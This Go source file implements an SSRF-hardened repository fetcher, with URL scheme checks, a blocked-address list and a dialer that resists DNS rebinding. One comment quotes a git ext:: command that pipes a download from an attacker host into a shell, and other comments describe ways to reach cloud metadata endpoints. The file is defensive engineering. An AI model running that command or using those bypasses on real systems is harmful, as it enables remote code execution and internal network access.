// Package fetcher materializes untrusted source exactly once.
//
// It is the ONLY component that touches the network on a user's behalf, and
// the only one that holds git credentials (ADR-0008). That concentration is
// deliberate: the SSRF surface is one small auditable component rather than
// five workers, and compromising a scanner yields the code it was already
// scanning — not a token, not another tenant's data.
package fetcher

import (
	"context"
	"errors"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/encorebom/encorebom/libs/go-shared/platform/errs"
)

// ---------------------------------------------------------------------------
// URL validation — SHAPE
// ---------------------------------------------------------------------------

// ValidateURL checks the shape of a source URL.
//
// ⚠ THIS IS NOT THE SSRF DEFENCE. It rejects inputs that are wrong on their
// face so the user gets an immediate error, and it kills the schemes that are
// dangerous regardless of destination. The defence against reaching an internal
// address is SafeDialer, which validates the IP actually connected to.
//
// The scheme allowlist is the load-bearing part:
//
//	ext::   git's ext transport executes an ARBITRARY COMMAND from the URL.
//	        `ext::sh -c 'curl attacker|sh'` is remote code execution with no
//	        exploit required — it is the documented behaviour of the transport.
//	file:   reads our own disk.
//	http:   credentials and source in the clear.
//	git:    unauthenticated, unencrypted, and unauthenticatable.
//	ssh:    would require us to hold a key.
func ValidateURL(raw string) (*url.URL, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil, errs.New(errs.ValidationFieldRequired, "no source URL supplied")
	}
	if len(raw) > 2048 {
		return nil, errs.New(errs.FetchURLSchemeForbidden, "source URL is too long")
	}

	// Control characters and whitespace before parsing: a newline in a URL that
	// later reaches a command line is argument injection, and url.Parse accepts
	// some of them.
	if strings.ContainsAny(raw, "\x00\n\r\t ") {
		return nil, errs.New(errs.FetchURLSchemeForbidden,
			"source URL contains whitespace or control characters")
	}

	// `ext::` never reaches url.Parse as a recognizable scheme, so check the
	// raw string first. Case-insensitively: `EXT::` works just as well.
	lower := strings.ToLower(raw)
	for _, prefix := range []string{"ext::", "ext:"} {
		if strings.HasPrefix(lower, prefix) {
			return nil, errs.New(errs.FetchURLSchemeForbidden,
				"git's ext:: transport executes an arbitrary command and is never permitted")
		}
	}

	u, err := url.Parse(raw)
	if err != nil {
		return nil, errs.New(errs.FetchURLSchemeForbidden, "source URL is not a valid URL")
	}

	if strings.ToLower(u.Scheme) != "https" {
		return nil, errs.Newf(errs.FetchURLSchemeForbidden,
			"source URL must use https (got %q)", u.Scheme)
	}
	if u.Hostname() == "" {
		return nil, errs.New(errs.FetchURLSchemeForbidden, "source URL has no host")
	}
	// Credentials in the URL would reach argv, process listings and logs. The
	// credential travels through a git credential helper instead.
	if u.User != nil {
		return nil, errs.New(errs.FetchURLSchemeForbidden,
			"remove credentials from the URL; supply a token separately")
	}
	return u, nil
}

// ---------------------------------------------------------------------------
// Address blocking — CONNECTION TIME
// ---------------------------------------------------------------------------

// blockedNets are the ranges a fetch must never reach.
//
// From docs/05-SECURITY-MODEL.md §4, plus ranges that section does not
// enumerate but which are the same class of mistake:
//
//	100.64.0.0/10   carrier-grade NAT — routes to the provider's network
//	192.0.0.0/24    IETF protocol assignments
//	198.18.0.0/15   benchmarking; routable inside some clouds
//	224.0.0.0/4     multicast
//	64:ff9b::/96    NAT64 — embeds an IPv4 address, so ::ffff:169.254.169.254
//	                style bypasses apply
var blockedNets = func() []*net.IPNet {
	cidrs := []string{
		// IPv4
		"0.0.0.0/8",          // "this network"; 0.0.0.0 means localhost on Linux
		"10.0.0.0/8",         // RFC1918
		"100.64.0.0/10",      // CGNAT
		"127.0.0.0/8",        // loopback
		"169.254.0.0/16",     // link-local — CLOUD METADATA lives at 169.254.169.254
		"172.16.0.0/12",      // RFC1918
		"192.0.0.0/24",       // IETF protocol assignments
		"192.168.0.0/16",     // RFC1918
		"198.18.0.0/15",      // benchmarking
		"224.0.0.0/4",        // multicast
		"240.0.0.0/4",        // reserved
		"255.255.255.255/32", // broadcast
		// IPv6
		"::/128",        // unspecified
		"::1/128",       // loopback
		"64:ff9b::/96",  // NAT64 — carries an embedded IPv4
		"100::/64",      // discard-only
		"2001:db8::/32", // documentation
		"fc00::/7",      // unique local
		"fe80::/10",     // link-local
		"ff00::/8",      // multicast
	}
	out := make([]*net.IPNet, 0, len(cidrs))
	for _, c := range cidrs {
		_, n, err := net.ParseCIDR(c)
		if err != nil {
			// A malformed constant here would silently disable a block, so
			// fail at init rather than at the moment it matters.
			panic("fetcher: bad blocked CIDR " + c + ": " + err.Error())
		}
		out = append(out, n)
	}
	return out
}()

// ErrBlockedAddress is returned when a resolved address is not permitted.
var ErrBlockedAddress = errors.New("address is in a blocked range")

// IsBlockedIP reports whether an address must not be connected to.
//
// UNWRAPS IPv4-MAPPED IPv6 FIRST. `::ffff:169.254.169.254` is a real bypass:
// it is an IPv6 address that routes to the IPv4 metadata endpoint, and a check
// that only consults the IPv6 table lets it straight through. net.IP.To4()
// returns non-nil for the mapped form, so testing that first covers it.
func IsBlockedIP(ip net.IP) bool {
	if ip == nil {
		return true // an address we cannot parse is not an address we dial
	}
	if v4 := ip.To4(); v4 != nil {
		ip = v4
	}

	// Belt and braces alongside the CIDR table: these catch anything the list
	// misses, and the list catches what the stdlib's categories do not
	// (metadata, CGNAT, NAT64).
	if ip.IsLoopback() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() ||
		ip.IsInterfaceLocalMulticast() || ip.IsUnspecified() || ip.IsMulticast() {
		return true
	}

	for _, n := range blockedNets {
		if n.Contains(ip) {
			return true
		}
	}
	return false
}

// ---------------------------------------------------------------------------
// The dialer
// ---------------------------------------------------------------------------

// SafeDialer resolves a host, validates every candidate address, and connects
// to an address it validated.
//
// ⚠ THE WHOLE POINT: THIS DEFEATS DNS REBINDING.
//
// A parse-time check asks "does this hostname resolve to something public?" and
// the attacker answers truthfully — then changes the answer before the connect.
// The gap between the two lookups is the vulnerability, and it is not a race
// that can be narrowed away: the attacker controls the DNS TTL.
//
// The only reliable defence is to connect to the ADDRESS YOU VALIDATED. So this
// dialer resolves once, filters, and dials the resulting IP literal — the second
// lookup that the attack depends on never happens.
type SafeDialer struct {
	// Resolver is overridable for tests. nil means net.DefaultResolver.
	Resolver *net.Resolver
	// Timeout bounds one connection attempt.
	Timeout time.Duration

	// mu guards attempts, which records what was dialed for assertions and
	// audit. Bounded, so a long-running fetcher cannot grow it without limit.
	mu       sync.Mutex
	attempts []DialAttempt
}

// DialAttempt records one connection decision.
type DialAttempt struct {
	Host    string
	IP      string
	Blocked bool
}

const maxRecordedAttempts = 64

// DialContext is the net.Dialer-compatible hook.
func (d *SafeDialer) DialContext(ctx context.Context, network, addr string) (net.Conn, error) {
	host, port, err := net.SplitHostPort(addr)
	if err != nil {
		return nil, fmt.Errorf("fetcher: malformed address %q: %w", addr, err)
	}

	// A literal IP skips resolution — and must still be validated, or
	// https://169.254.169.254/ walks straight past the whole mechanism.
	if ip := net.ParseIP(host); ip != nil {
		if IsBlockedIP(ip) {
			d.record(host, ip.String(), true)
			return nil, blockedErr(host, ip)
		}
		d.record(host, ip.String(), false)
		return d.dial(ctx, network, net.JoinHostPort(ip.String(), port))
	}

	resolver := d.Resolver
	if resolver == nil {
		resolver = net.DefaultResolver
	}
	ips, err := resolver.LookupIPAddr(ctx, host)
	if err != nil {
		return nil, fmt.Errorf("fetcher: resolving %q: %w", host, err)
	}
	if len(ips) == 0 {
		return nil, fmt.Errorf("fetcher: %q resolved to no addresses", host)
	}

	// EVERY candidate must be permitted, and a single blocked one fails the
	// whole dial. Trying the next address instead would let an attacker publish
	// [169.254.169.254, 93.184.216.34] and rely on us skipping to the good one
	// on some runs and not others — non-deterministic security is no security.
	for _, ipAddr := range ips {
		if IsBlockedIP(ipAddr.IP) {
			d.record(host, ipAddr.IP.String(), true)
			return nil, blockedErr(host, ipAddr.IP)
		}
	}

	var lastErr error
	for _, ipAddr := range ips {
		d.record(host, ipAddr.IP.String(), false)
		// Dial the IP LITERAL. Passing the hostname here would re-resolve and
		// reopen the rebinding window this whole type exists to close.
		conn, err := d.dial(ctx, network, net.JoinHostPort(ipAddr.IP.String(), port))
		if err == nil {
			return conn, nil
		}
		lastErr = err
	}
	return nil, lastErr
}

func (d *SafeDialer) dial(ctx context.Context, network, addr string) (net.Conn, error) {
	timeout := d.Timeout
	if timeout <= 0 {
		timeout = 15 * time.Second
	}
	return (&net.Dialer{Timeout: timeout}).DialContext(ctx, network, addr)
}

func (d *SafeDialer) record(host, ip string, blocked bool) {
	d.mu.Lock()
	defer d.mu.Unlock()
	if len(d.attempts) >= maxRecordedAttempts {
		return
	}
	d.attempts = append(d.attempts, DialAttempt{Host: host, IP: ip, Blocked: blocked})
}

// Attempts returns the recorded dial decisions, for audit and tests.
func (d *SafeDialer) Attempts() []DialAttempt {
	d.mu.Lock()
	defer d.mu.Unlock()
	return append([]DialAttempt(nil), d.attempts...)
}

func blockedErr(host string, ip net.IP) error {
	// Naming the resolved IP is deliberate: the user needs to know their
	// hostname pointed somewhere internal, and it is their own DNS.
	return errs.Newf(errs.FetchPrivateAddressBlocked,
		"%s resolved to %s, which is in a blocked range", host, ip)
}

// ---------------------------------------------------------------------------
// HTTP client
// ---------------------------------------------------------------------------

// MaxRedirects is the redirect budget. Each hop is re-validated.
const MaxRedirects = 3

// SafeHTTPClient builds an http.Client that cannot be redirected into a private
// address.
//
// Two independent controls, because either alone is insufficient:
//
//	the DIALER validates the address of every connection, including those made
//	for redirect targets — this is what actually stops the request;
//
//	the CheckRedirect hook re-runs SHAPE validation on each hop, so a redirect
//	to file:// or ext:: is refused even though the dialer would never see it.
func SafeHTTPClient(dialer *SafeDialer) *http.Client {
	if dialer == nil {
		dialer = &SafeDialer{}
	}
	return &http.Client{
		Timeout: 5 * time.Minute,
		Transport: &http.Transport{
			DialContext: dialer.DialContext,
			// Proxies are disabled: a proxy would connect on our behalf and
			// every address check here would be bypassed.
			Proxy:                 nil,
			TLSHandshakeTimeout:   15 * time.Second,
			ResponseHeaderTimeout: 60 * time.Second,
			MaxIdleConns:          4,
			DisableCompression:    false,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= MaxRedirects {
				return errs.Newf(errs.FetchURLSchemeForbidden,
					"too many redirects (limit %d)", MaxRedirects)
			}
			if _, err := ValidateURL(req.URL.String()); err != nil {
				return err
			}
			return nil
		},
	}
}
